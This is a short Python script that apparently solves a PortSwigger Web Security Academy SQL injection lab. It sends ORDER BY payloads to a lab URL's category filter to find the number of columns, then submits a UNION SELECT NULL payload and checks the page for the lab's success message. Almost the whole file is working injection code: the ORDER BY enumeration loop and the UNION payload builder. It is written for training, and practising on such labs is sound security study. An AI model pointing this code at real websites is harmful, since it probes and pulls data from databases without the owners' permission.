# Retrieving data from other database tables
# Union 1 - Determining the number of columns required in an SQL injection UNION attack

import requests
url = "https://acd91f1d1f8ef63b80b7353300730004.web-security-academy.net/filter?category=Pets"

def enum_columns():
    '''
    Get valid number of columns using ORDER BY query
    '''
    for x in range(1,10):
        payload = f"' ORDER BY {x}--"
        r = requests.get(url+payload)
        if r.status_code == 500:
            break
    return x-1

# Get the no. of columns, then append NULL = times the columns
columns = enum_columns()
payload = "' UNION SELECT "
payload += ",".join(['NULL']*columns)
payload += "--"

print(url+payload)
try:
    r_solve = requests.get(url+payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)
    